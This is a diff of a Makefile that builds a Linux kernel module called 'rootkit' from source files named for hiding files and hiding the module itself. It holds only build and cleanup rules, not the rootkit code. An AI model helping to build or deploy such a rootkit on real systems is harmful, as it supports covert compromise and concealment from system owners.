@@ -1,31 +1,16 @@
-# Makefile to compile a Linux kernel module and place artifacts in bin/
+KDIR ?= /lib/modules/$(shell uname -r)/build
 
-# Module name
-MODULE_NAME := rootkit
+# Our module name is 'my_module'
+# We list the object files for each C file we want to compile into this module
+obj-m := rootkit.o
+rootkit-objs := src/main.o src/hide_file.o src/hide_rootkit.o
 
-# Kernel build directory
-KDIR := /lib/modules/$(shell uname -r)/build
-
-# The target is the kernel module
-obj-m := $(MODULE_NAME).o
-
-# Directory for build outputs
-BIN_DIR := bin
-
-# Default target to build the module
+# Default rule: build the module(s)
 all:
-	# 1) Build in the current directory (standard external module build)
 	$(MAKE) -C $(KDIR) M=$(PWD) modules
+	rm src/.*.o.cmd src/*.o .*.cmd Module.symvers  rootkit.mod.o rootkit.mod.c rootkit.mod modules.order rootkit.o
+	
 
-	# 2) Create bin/ if it doesn't exist
-	mkdir -p $(BIN_DIR)
-
-	# 3) Move all generated build files into bin/
-	#    (We use '|| true' to ignore "file not found" warnings.)
-	mv -f *.ko *.o *.mod *.mod.c modules.order Module.symvers .*.cmd \
-	       $(BIN_DIR) 2>/dev/null || true
-	mv -f .tmp_versions $(BIN_DIR) 2>/dev/null || true
-
-# Clean target to remove build artifacts
+# Clean rule: clean up built files
 clean:
-	rm -rf $(BIN_DIR)
+	$(MAKE) -C $(KDIR) M=$(PWD) clean
